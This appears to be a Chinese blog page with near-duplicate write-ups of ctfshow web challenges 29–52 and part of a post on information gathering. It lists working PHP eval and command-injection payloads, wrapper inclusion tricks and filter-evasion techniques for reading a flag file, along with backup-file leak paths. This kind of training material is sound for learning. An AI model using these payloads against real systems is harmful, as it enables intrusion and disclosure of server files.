      <a data-url="http://example.com/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="cm9r4oihx00005cuo5qz16149" data-title="requests库的学习" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ctfshow29-52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/ctfshow29-52/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T13:00:54.000Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/13/ctfshow29-52/">ctfshow29-52</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg" alt="64ae6cbc-95ca-46c5-9f56-36f524cb1e94">!](.&#x2F;img&#x2F;64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg)</p>
<p>Web29 eval函数表示把后面的内容当成php代码执行，</p>
<ol>
<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
</ol>
<p>而不能直接?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 因为后面的内容不是标准的php代码</p>
<ol start="2">
<li>?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);</li>
<li>?c&#x3D;echo <code>tac fla*</code>; 注意要用<code> </code>包起来 这个反引号代替了system函数</li>
</ol>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg" alt="b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225">!](.&#x2F;img&#x2F;b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg)</p>
<p>System被过滤也可以用passthru来替代system执行系统命令</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/d359d230-d3cc-45e6-a618-2404d84895db.jpg" alt="d359d230-d3cc-45e6-a618-2404d84895db">!](.&#x2F;img&#x2F;d359d230-d3cc-45e6-a618-2404d84895db.jpg)</p>
<p>31题 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行</p>
<p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；</p>
<p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/32038e0e-fe67-4653-b5e1-e81652560b33.jpg" alt="32038e0e-fe67-4653-b5e1-e81652560b33">!](.&#x2F;img&#x2F;32038e0e-fe67-4653-b5e1-e81652560b33.jpg)</p>
<p>32题 ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p>
<p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg" alt="daad7edc-8f4e-4598-9ded-7ec6dac8cfb4">!](.&#x2F;img&#x2F;daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg)</p>
<p>38题 看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?></p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?> </p>
<?=是简化的<?php echo...?>

<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg" alt="9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5">!](.&#x2F;img&#x2F;9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg)</p>
<p>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。</p>
<p>echo：PHP中的输出函数，用于输出字符串或表达式的结果。</p>
<p>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。</p>
<p>next：PHP中的函数，用于将内部指针向前移动到下一个元素。</p>
<p>array_reverse：PHP中的函数，用于反转数组元素的顺序。</p>
<p>scandir：PHP中的函数，用于列出目录中的文件和子目录。</p>
<p>pos：PHP中的函数，返回数组中当前内部指针指向的值。</p>
<p>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。</p>
<p>具体来说，这段代码的执行流程如下：</p>
<p>localeconv()：获取本地化的数字和货币格式信息。</p>
<p>pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。</p>
<p>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。</p>
<p>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。</p>
<p>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。</p>
<p>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。</p>
<p>echo：输出这个高亮显示的内容。</p>
<p>payload2：</p>
<p>?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);</p>
<p>1</p>
<p>payload2解释：</p>
<p>?c&#x3D;eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p>
<p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。</p>
<p>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。</p>
<p>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。</p>
<p>eval()：这个函数执行字符串作为PHP代码。</p>
<p>这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。</p>
<p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p>
<p>system()：这个函数执行一个shell命令，并将完整的输出返回。</p>
<p>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。</p>
<p>这段代码的目的是尝试执行flag.php文件的反向内容。</p>
<p>​            </p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a></p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg" alt="a8e336e1-6ad1-4687-abfe-ab869ccdb701">!](.&#x2F;img&#x2F;a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg)</p>
<p> dev&#x2F;null 2&gt;&amp;1 </p>
<p><strong>·</strong> <em><strong>*command &gt; &#x2F;dev&#x2F;null*</strong></em> ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。</p>
<p><strong>·</strong> <em><strong>*command 2&gt; &#x2F;dev&#x2F;null*</strong></em> ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。</p>
<p><strong>·</strong> <em><strong>*command &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1*</strong></em><em><strong>*（等价于*</strong></em> <em><strong>*command &amp;&gt; &#x2F;dev&#x2F;null*</strong></em> <em><strong>*）*</strong></em> ：</p>
<p>· &gt; 先将标准输出重定向到 &#x2F;dev&#x2F;null 。</p>
<p>· 2&gt;&amp;1 中 2 代表标准错误输出，&amp; 表示绑定，1 是标准输出，即把标准错误输出绑定到标准输出，由于标准输出已定向到 &#x2F;dev&#x2F;null ，所以标准错误输出也被定向到 &#x2F;dev&#x2F;null ，命令所有输出都被丢弃。常用于不想看到命令任何输出，或避免输出干扰、减少日志量等场景 。比如在运行一些后台脚本任务时，可让其输出不显示在终端 。</p>
<p>解法1 ?c&#x3D;ls;  ?c&#x3D;tac fla.php; ;后面为空，丢进黑洞的就是空 当用户传入 tac flag.php;ls 时，实际执行的命令变为 tac flag.php;ls &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1。此时，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 只对 ls 命令生效，因为它是重定向符号后面紧邻的命令，而 tac flag.php 命令不受影响，其输出会正常显示，从而绕过了 &#x2F;dev&#x2F;null 对输出的屏蔽</p>
<p>解法2 ?c&#x3D;tac flag.php||  逻辑或|| 当有一个为真则为真，A||B 若A为真，则只进行A 不管B </p>
<p>解法3  ?c&#x3D;ls%26  &amp;的URL编码是%26   在命令 ls &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 中，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 是针对 &amp; 之后的部分，而 &amp; 会将 ls 命令放到后台执行，使得 ls 命令独立于重定向操作。也就是说，重定向操作无法影响到已经被放到后台执行的 ls 命令，所以 ls 命令的输出不会被重定向到 &#x2F;dev&#x2F;null，而是正常显示出来。 &amp; 也可以看作是命令分隔符的一种特殊形式。它和分号 ; 类似，都能分隔多个命令，但 &amp; 会让前面的命令在后台运行。</p>
<p>?c&#x3D;ls%26%26 同理</p>
<p>逻辑与运算符&amp;&amp; 条件1&amp;&amp;条件2 当1为真继续2 若1为假 则2就不管了 </p>
<p>按位与运算符&amp; 用于对两个整数的二进制位进行逐位比较。只有当两个对应位都为 1 时，结果的该位才为 1，否则为 0。</p>
<p>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。</p>
<p>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。</p>
<p>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg" alt="a8d6efd1-702a-4b0c-ba05-50db366e5feb">!](.&#x2F;img&#x2F;a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg)</p>
<p>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26 </p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg" alt="2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d">!](.&#x2F;img&#x2F;2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg)</p>
<p>44 ?c&#x3D;tac fla*||</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg" alt="35e0ef5d-1414-4704-a7a0-dd8b67a77765">!](.&#x2F;img&#x2F;35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg)</p>
<p>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg" alt="6604ed43-bf17-4c5b-b1fb-46dd73f12222">!](.&#x2F;img&#x2F;6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg)</p>
<p>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格</p>
<p>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符 </p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
<p>47 ?c&#x3D;tac%09fla?.php||  绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次</p>
<p>48 49同上</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e-1744549925976-13.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
<p>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg" alt="78455c18-cb78-4c6e-a49e-7464ddcc5eed">!](.&#x2F;img&#x2F;78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg)</p>
<p>50 ?c&#x3D;tac&lt;fla’’g.php|| </p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2f3641b0-10f1-4962-b2a8-82703122f328.jpg" alt="2f3641b0-10f1-4962-b2a8-82703122f328">!](.&#x2F;img&#x2F;2f3641b0-10f1-4962-b2a8-82703122f328.jpg)</p>
<p>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac</p>
<p>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p>
<p><strong>·</strong> <em><strong>*nl*</strong></em> <em><strong>*命令*</strong></em>：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。</p>
<p><strong>·</strong> <em><strong>*more*</strong></em> <em><strong>*命令*</strong></em>：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。</p>
<p><strong>·</strong> <em><strong>*vi*</strong></em> <em><strong>*命令*</strong></em>：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。</p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg" alt="82bcfa46-9fb3-4213-b1ae-e10853679a2c">!](.&#x2F;img&#x2F;82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg)</p>
<p>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p>
<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg" alt="eec2ce71-c80c-41a0-b45e-691b2770eaff">!](.&#x2F;img&#x2F;eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/ctfshow29-52/" data-id="cm9qgphqs000a00uo598vaokm" data-title="ctfshow29-52" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ctfshow web29-52 (部分）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T07:56:57.953Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Web29 </p>
<p><img src="https://i-blog.csdnimg.cn/direct/d998a912ddf44a6dbc2419acbad09518.png" alt="在这里插入图片描述"></p>
<p>eval函数表示把后面的内容当成php代码执行，</p>
<ol>
<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>而不能直接?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 因为后面的内容不是标准的php代码<br>2.?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);<br>3.?c&#x3D;echo `tac fla*&#96;; 注意要用反引号`&#96;包起来 这个反引号代替了system函数</li>
</ol>
<p><img src="https://i-blog.csdnimg.cn/direct/3cd6a0560bd24091b97867ab9198c94c.png"></p>
<p>30 system被过滤也可以用passthru来替代system执行系统命令<br><img src="https://i-blog.csdnimg.cn/direct/456388f310ac4e12bd7b7e76507fef1e.png" alt="在这里插入图片描述"></p>
<p>31 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p>
<p><img src="https://i-blog.csdnimg.cn/direct/1ba9b4e817914d78b4cefe2d4e453ca6.png" alt="在这里插入图片描述"><br>32  ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?><br>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src="https://i-blog.csdnimg.cn/direct/c2828ed2136d4d778900daca8ea50a36.png" alt="在这里插入图片描述"><br>38看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?><br>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?><br><?= 是简化的 <?php echo ... ?><br><img src="https://i-blog.csdnimg.cn/direct/6c5fc2187d5c49bea88e0282701070b9.png" alt="在这里插入图片描述"><br>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。<br>echo：PHP中的输出函数，用于输出字符串或表达式的结果。<br>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。<br>next：PHP中的函数，用于将内部指针向前移动到下一个元素。<br>array_reverse：PHP中的函数，用于反转数组元素的顺序。<br>scandir：PHP中的函数，用于列出目录中的文件和子目录。<br>pos：PHP中的函数，返回数组中当前内部指针指向的值。<br>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。<br>具体来说，这段代码的执行流程如下：</p>
<p>localeconv()：获取本地化的数字和货币格式信息。<br>pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。<br>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。<br>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。<br>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。<br>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。<br>echo：输出这个高亮显示的内容。<br>payload2：<br>?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);<br>1<br>payload2解释：<br>?c&#x3D;eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p>
<p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。<br>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。<br>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。<br>eval()：这个函数执行字符串作为PHP代码。<br>这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。</p>
<p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p>
<p>system()：这个函数执行一个shell命令，并将完整的输出返回。<br>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。<br>这段代码的目的是尝试执行flag.php文件的反向内容。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a><br><img src="https://i-blog.csdnimg.cn/direct/ac258928b27c4cd9be04c492d6dd26c9.png" alt="在这里插入图片描述"><br>dev&#x2F;null 2&gt;&amp;1<br>command &gt; &#x2F;dev&#x2F;null ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。<br>command 2&gt; &#x2F;dev&#x2F;null ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。<br>command &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1（等价于 command &amp;&gt; &#x2F;dev&#x2F;null ） ：</p>
<blockquote>
<p>先将标准输出重定向到 &#x2F;dev&#x2F;null 。<br>2&gt;&amp;1 中 2 代表标准错误输出，&amp; 表示绑定，1 是标准输出，即把标准错误输出绑定到标准输出，由于标准输出已定向到 &#x2F;dev&#x2F;null ，所以标准错误输出也被定向到 &#x2F;dev&#x2F;null ，命令所有输出都被丢弃。常用于不想看到命令任何输出，或避免输出干扰、减少日志量等场景 。比如在运行一些后台脚本任务时，可让其输出不显示在终端 。<br>解法1 ?c&#x3D;ls;  ?c&#x3D;tac fla.php; ;后面为空，丢进黑洞的就是空 当用户传入 tac flag.php;ls 时，实际执行的命令变为 tac flag.php;ls &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1。此时，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 只对 ls 命令生效，因为它是重定向符号后面紧邻的命令，而 tac flag.php 命令不受影响，其输出会正常显示，从而绕过了 &#x2F;dev&#x2F;null 对输出的屏蔽</p>
</blockquote>
<p>解法2 ?c&#x3D;tac flag.php||   逻辑或|| 当有一个为真则为真，A||B 若A为真，则只进行A 不管B<br>解法3  ?c&#x3D;ls%26  &amp;的URL编码是%26    在命令 ls &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 中，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 是针对 &amp; 之后的部分，而 &amp; 会将 ls 命令放到后台执行，使得 ls 命令独立于重定向操作。也就是说，重定向操作无法影响到已经被放到后台执行的 ls 命令，所以 ls 命令的输出不会被重定向到 &#x2F;dev&#x2F;null，而是正常显示出来。  &amp; 也可以看作是命令分隔符的一种特殊形式。它和分号 ; 类似，都能分隔多个命令，但 &amp; 会让前面的命令在后台运行。<br>?c&#x3D;ls%26%26 同理<br>逻辑与运算符&amp;&amp; 条件1&amp;&amp;条件2 当1为真继续2 若1为假 则2就不管了<br>按位与运算符&amp; 用于对两个整数的二进制位进行逐位比较。只有当两个对应位都为 1 时，结果的该位才为 1，否则为 0。<br>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。<br>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。<br>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p>
<p><img src="https://i-blog.csdnimg.cn/direct/18552782bc6d444b8c1ce385ad74dd81.png" alt="在这里插入图片描述"><br>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26<br><img src="https://i-blog.csdnimg.cn/direct/79b9fcfb6c3b4524b8f9e2dca5697d42.png" alt="在这里插入图片描述"><br>44 ?c&#x3D;tac fla*||<br><img src="https://i-blog.csdnimg.cn/direct/299950984d2d43f39db7c81e65b3ded5.png" alt="在这里插入图片描述"><br>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||<br><img src="https://i-blog.csdnimg.cn/direct/88dbbbe8445540d3aab25a80fb1bdf77.png" alt="在这里插入图片描述"><br>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格<br>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符<br><img src="https://i-blog.csdnimg.cn/direct/404230580271469196b1a1dc690c13fd.png" alt="在这里插入图片描述"><br>47 ?c&#x3D;tac%09fla?.php||   绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次<br><img src="https://i-blog.csdnimg.cn/direct/8a260c15430a43dd9ef28e74dc0c1e8c.png" alt="在这里插入图片描述"><br>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。<br><img src="https://i-blog.csdnimg.cn/direct/4b4b60de8c4d452583e874bb8ef008fb.png" alt="在这里插入图片描述"><br>50 ?c&#x3D;tac&lt;fla’’g.php||<br><img src="https://i-blog.csdnimg.cn/direct/87c61c55d27043a1b13b887d8bbeebc1.png" alt="在这里插入图片描述"><br>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac<br>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p>
<p>nl 命令：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。<br>more 命令：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。<br>vi 命令：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。<br><img src="https://i-blog.csdnimg.cn/direct/6512d4273c40450eb778e65c77a34bc2.png" alt="在这里插入图片描述"><br>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" data-id="cm9qgphqq000500uo2lo6et4y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ctfshow 信息搜集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  <time class="dt-published" datetime="2025-04-13T07:29:08.326Z" itemprop="datePublished">2025-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。即，Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br> robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>
<p>phps源码泄露 在URL后面加index.phps<br>常见的文件备份后缀‘.git’ <strong>‘.swp’</strong>‘.bash_history’<strong>‘.bkf’</strong>‘.svn’ ‘.bak’’.~’<br>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件</p>
<p>第一次意外退出生成的是.swp<br>第二次意外退出生成的是.swo<br>第三次为.swn<br>因此可以尝试打开第一次退出时产生的这个文件,输入url&#x2F;index.php.swp</p>
